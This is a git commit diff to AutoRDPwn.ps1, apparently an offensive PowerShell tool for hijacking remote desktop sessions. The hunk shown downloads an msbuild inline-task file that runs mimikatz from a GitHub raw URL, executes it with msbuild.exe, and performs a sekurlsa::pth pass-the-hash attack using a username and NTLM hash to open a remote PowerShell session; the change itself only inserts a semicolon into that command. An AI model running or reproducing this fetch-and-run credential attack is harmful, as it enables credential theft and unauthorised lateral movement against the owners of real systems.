239994ee37f4a4609868f57b90998a2b696730b7
JoelGMSec <34335312+JoelGMSec@users.noreply.github.com>
2018-09-12 17:53:41 +0200

    Update AutoRDPwn.ps1

--- AutoRDPwn.ps1
+++ AutoRDPwn.ps1
@@ -129,7 +129,7 @@ function ConvertFrom-SecureToPlain {
 
 
 if(Test-Path variable:global:PassTheHash) { Invoke-WebRequest -Uri "https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20mimikatz.xml" -Outfile SimpleTasks.csproj
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe sekurlsa::pth /user:$user /ntlm:$hash /run:"powershell $RDP = New-PSSession -Computer $computer -Authentication Kerberos" } 
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe ; sekurlsa::pth /user:$user /ntlm:$hash /run:"powershell $RDP = New-PSSession -Computer $computer -Authentication Kerberos" } 
 else { Write-Host ""
 $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
 $RDP = New-PSSession -Computer $computer -credential $credential }
